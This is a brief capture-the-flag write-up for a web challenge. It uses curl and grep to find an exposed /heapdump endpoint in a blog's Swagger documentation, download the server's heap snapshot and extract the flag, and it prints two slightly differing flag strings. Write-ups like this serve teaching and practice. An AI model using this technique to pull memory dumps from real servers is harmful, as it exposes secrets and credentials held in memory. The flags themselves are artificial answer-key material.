## Descripción
Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.

The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden. The website is running [picoCTF News](http://xebec.cylabacademy.net:15436/).

1.- Explore backend development with us

2.- The head was dumped.
## Solución
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://xebec.cylabacademy.net:15436/ | grep api-docs                                                                                                                     
                                <a href="" class="text-blue-600">#swagger UI</a> , <a href="/api-docs" class="text-blue-600 hover:underline">#API Documentation</a> 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -s http://xebec.cylabacademy.net:15436/api-docs/swagger-ui-init.js | grep heapdump
      "/heapdump": {
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -s -o heapdump.heapsnapshot http://xebec.cylabacademy.net:15436/heapdump          
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ strings heapdump.heapsnapshot | grep -o 'academy{[^}]*}'
academy{Pat!3nt_15_Th3_K3y_9b928e80}
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ 



academy{Pat!3nt_15_Th3_K3y_1dc68c38}
```
```

```

## Notas Adicionales

## Referencias
-